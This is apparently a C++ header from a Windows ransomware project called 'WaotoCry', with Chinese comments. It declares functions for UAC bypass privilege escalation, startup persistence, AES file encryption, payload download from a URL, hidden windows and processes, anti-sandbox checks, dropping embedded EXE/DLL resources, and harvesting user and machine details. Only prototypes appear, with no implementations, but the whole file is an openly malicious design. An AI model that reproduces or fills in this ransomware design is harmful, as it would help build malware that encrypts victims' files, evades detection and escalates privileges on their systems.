#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include  <direct.h>  
#include <tchar.h>
#include "resource.h"
#pragma comment(lib,"URlmon")
#pragma warning(disable :4996)
#define MAX_SIZE 255

using namespace std;




typedef struct 
{
	int Proconn_data;//进程数据
	int process_break_sendbox;
	char* get_process_dir;//获取进程目录
	char*  process_new_path;//进程现在的路径
	string process_pid_path;//通过PID获取进程路径
	string target_process_path;//目标进程路径
	string usl_path;//URL下载路径
	DWORD get_pid;//获取PID
	BOOL search;//查找
	BOOL off;//控制开关
}WaotoCry;

typedef struct {
	string public_key;//公钥
	string private_key;//私钥
	string encryption_data;//加密后的密文
	string uncryption_data;//解密后的明文
}WaotoCry_encryption;





//static string file_Config_dir = "C:\\Users\\Public\\Documents\\dD0bB0";
static string file_Config_dir = "C:\\Process File\\dD0bB0";


//Bypass.cpp
/*
* @brief UAC提权模块
* @praram new_process_path 当前进程所在的路径
*/
int add_double_data(char* new_process_path);
/*
* @brief 开机自启动
* @praram 当前进程所在的路径
*/
int increase(char* start_process);
/*
* @brief 查找指定注册表键值是否存在
*/
int search_regedit();
/*
* @brief 创建进程模块[现在用于配合UAC提权]
*/
int BypassUAC();

//Encryption.cpp
/*
* @brief 加密文件
* @praram process_path 你需要加密的文件全路径
*/
int Encryption(char process_path);
/*
* @brief AES加密模块
*/
int Aes_Encryption_Funtion(BYTE* ppassword, DWORD dwpasswordLength, BYTE* pData, DWORD& dwDatalength, DWORD dwBufferLength);
/*
* @brief AES解密模块
*/
int AES_decrypt_Funtion(BYTE* pPassword, DWORD dwPasswordlength, BYTE* pData, DWORD& dwDataLength, DWORD dwbufferLength); 

/*
* @brief 创建一个解密用的密钥
* @praram msg 密文
* @praram key 公钥(你自己创建的)
*/
std::string extend_key(std::string& msg, std::string& key);
 /**
* @brief 创建新密钥模块(用于解密密文)
* @param msg 未加密的明文
* @param key 你创建的公钥
*/
std::string encrypt_vigenere(std::string& msg, std::string& key); //? vigenere 加密模块
/*
* @brief  解密模块
* @param encryptedMsg 需要解密的密文
* @praram newKey 由函数[extend_key]生成的解密密钥
*/
std::string decrypt_vigenere(std::string& encryptedMsg, std::string& newKey); //? vigenere 解密模块

//Connect
/*
* @brief 下载模块
* @praram usl 下载URL
* @praram file_name 下载到本地后的名字
*/
int download(string usl, string file_name);


//Funtions
/*
* @brief 生成加密用的密钥
*/
string password();
/*
* @brief 隐藏运行窗口
*/
void no_windows();
/*
* @brief  获取当前PROCESS路径
*/
char *new_process_path(); 
/*
* @brief 获取进程现在的目录
*/
char *Get_Process_in_dir();
/*
* @brief 修改字符串内指定字符
* @praram no_replace 待修改的字符串
* @praram need_relace_string 需要查找[修改]的字符串
* @praram befor_replace  替换需要修改的字符串
*/
string replace_string(string no_replace, string need_relace_string, string befor_replace);
/*
* @brief 修改文件名称
* @praram old_name 原文件名
* @praram new_name 修改后的文件名
*/
int reaname(char *old_name, char *new_name); 
/*
* @brief 获取用户名
*/
string windows_username();
/*
* @brief 获取计算机名
*/
wstring windows_computer_name(); 
/*
* @brief 创建文件夹目录
* @praram 需要创建的位置
*/
bool windows_dir(string eatablish_path); 


//Anti Sendbox
/*
* @brief 获取当前进程[自己]父级PID
* @praram pid 进程自己的PID
*/
DWORD get_parent_processid(DWORD pid);
/*
* @praram 获取Explorer的PID
*/
DWORD get_explorer_processid();
/*
* @brief 反沙箱调试[Anti SendBOX]
*/
int determine();
/*
* @brief 获取指定进程的PID
* @praram name 你要获取进程的名字
*/
DWORD GetProcesspId(const char* name);
/*
* @brief 通过PID获取进程本地路径
* @praram process_pid 进程的PID
*/
string process_pid_to_path(DWORD process_pid);


//File operation
bool CreateMyFile(char* strFilePath, LPBYTE lpBuffer, DWORD dwSize);
/*
* @brief 释放资源文件
* @praram strFilePath 资源文件释放的路径
* @praram nResourceID 资源文件在Resource.h中的文件ID
* @praram strResourceName 释放的文件类型[EXP:exe--dll--jpg--png]
*/
bool CreateEXE(char* strFilePath, int nResourceID, char* strResourceName);
BOOL ReleaseDLLRes(LPCTSTR szDLLFullPath, UINT uResID, LPCTSTR szResType);//释放DLL到指定目录
/*
* @brief 获取系统TEMP的路径
*/
char Getsystemtamppath(); 



//kernel.cpp
/*
* @brief 隐藏进程
* @praram 进程名
*/
int hide_process(string process);


//search_regedit_information.cpp
/*
* @brief 查询CPU型号
*/
WCHAR search_regedit_CPU_information();
char search_regedit_GPU_information();
